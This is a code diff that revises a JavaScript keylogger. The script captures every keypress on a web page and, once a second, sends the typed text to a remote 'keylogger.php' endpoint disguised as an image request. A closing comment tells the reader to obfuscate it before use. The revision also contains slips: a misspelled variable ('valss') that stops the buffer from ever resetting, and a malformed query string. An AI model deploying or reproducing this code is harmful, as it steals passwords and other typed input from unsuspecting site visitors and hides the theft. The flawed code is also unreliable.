@@ -1,17 +1,24 @@
-var keys='';
-var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
-
+var vals='';
+var url1 = 'http://192.168.1.2/forum/system/keylogger.php?version=20200726c=';
+var url2 = ''
 document.onkeypress = function(e) {
 	get = window.event?event:e;
-	key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
+	val = get.keyCode?get.keyCode:get.charCode;
+	switch(val) {
+		case 13:
+			val = '[ENT]'
+			break;
+		// add other keycodes as needed, 9, and 8 didn't seem to work
+		default:
+			val = String.fromCharCode(val);		
+	}
+	vals+=val;
 }
 window.setInterval(function(){
-	if(keys.length>0) {
-		new Image().src = url+keys;
-		keys = '';
+	if(vals.length>0) {
+		new Image().src = url1+vals+url2;
+		valss = '';
 	}
 }, 1000);
 
-
+//Run this through an obfuscator, remove comments first
